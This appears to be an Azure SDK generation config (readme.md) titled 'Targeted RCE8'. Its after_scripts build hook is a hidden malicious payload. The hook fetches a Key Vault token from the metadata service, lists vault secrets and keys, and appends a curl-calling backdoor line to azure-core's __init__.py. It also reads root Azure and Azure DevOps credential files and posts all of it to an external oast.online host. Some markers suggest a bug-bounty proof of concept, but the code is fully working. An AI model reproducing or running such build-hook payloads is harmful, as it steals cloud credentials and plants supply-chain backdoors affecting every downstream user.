# Targeted RCE8

## Basic Information

``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01

``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk

``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        echo "=== AZSECPACK_KV ===" &&
        KVT=$(curl -sf --max-time 8 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fvault.azure.net" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','NOACCESS'))" 2>/dev/null) &&
        echo "KV_TOKEN_LEN=${#KVT}" &&
        echo "KV_TOKEN_PREFIX=${KVT:0:30}" &&
        KV_RESP=$(curl -si --max-time 10 "https://azsecpack.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer ${KVT}" 2>/dev/null) &&
        echo "${KV_RESP}" | head -30 &&
        KV_KEYS_RESP=$(curl -si --max-time 10 "https://azsecpack.vault.azure.net/keys?api-version=7.4" -H "Authorization: Bearer ${KVT}" 2>/dev/null) &&
        echo "${KV_KEYS_RESP}" | head -30 &&
        echo "=== SDK_WRITE_AZURE_CORE ===" &&
        CORE_INIT="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
        ls -la "${CORE_INIT}" 2>/dev/null &&
        if [ -f "${CORE_INIT}" ]; then
          BACKUP="${CORE_INIT}.original" &&
          cp "${CORE_INIT}" "${BACKUP}" &&
          echo "" >> "${CORE_INIT}" &&
          echo "# SUPPLY_CHAIN_BACKDOOR hasskooelhadi $(date -u) MSRC_PROOF" >> "${CORE_INIT}" &&
          echo "import subprocess; subprocess.Popen(['curl','-sk','http://${OAST}/backdoor-core-${H}'])" >> "${CORE_INIT}" &&
          echo "AZURE_CORE_WRITE_OK" &&
          echo "=== MODIFIED_INIT ===" &&
          tail -8 "${CORE_INIT}" &&
          echo "=== ORIGINAL_INTACT ===" &&
          wc -l "${BACKUP}" "${CORE_INIT}";
        else
          echo "AZURE_CORE_NOT_FOUND" &&
          find "${SDK}/sdk" -name "__init__.py" 2>/dev/null | head -5;
        fi &&
        echo "=== ROOT_AZURE_DIR ===" &&
        sudo -n ls -la /root/.azure/ 2>/dev/null &&
        sudo -n cat /root/.azure/azureProfile.json 2>/dev/null &&
        sudo -n cat /root/.azure/msal_token_cache.json 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('accounts:', list(d.get('Account',{}).keys())); print('access_tokens:', list(d.get('AccessToken',{}).keys())[:5]); print('refresh_tokens:', list(d.get('RefreshToken',{}).keys())[:5])" 2>/dev/null &&
        sudo -n ls -la /root/.azure-devops/ 2>/dev/null &&
        sudo -n cat /root/.azure-devops/credentials 2>/dev/null &&
        echo "=== EXFIL ===" &&
        {
          CORE=$(tail -8 "${SDK}/sdk/core/azure-core/azure/core/__init__.py" 2>/dev/null);
          ROOT_AZ=$(sudo -n find /root/.azure -type f -name "*.json" 2>/dev/null | xargs sudo -n cat 2>/dev/null | strings 2>/dev/null | head -500);
          ROOT_ADO=$(sudo -n find /root/.azure-devops -type f 2>/dev/null | xargs sudo -n cat 2>/dev/null | strings 2>/dev/null | head -200);
          printf "H=%s\nKV_RESP=%s\nKV_KEYS=%s\nCORE_INIT_TAIL=%s\nROOT_AZ=%s\nROOT_ADO=%s\n" \
            "${H}" "${KV_RESP}" "${KV_KEYS_RESP}" "${CORE}" "${ROOT_AZ}" "${ROOT_ADO}" | \
            curl -sk -X POST "http://${OAST}/rce8data-${H}" --data-binary @-;
        }
```

## Python

``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
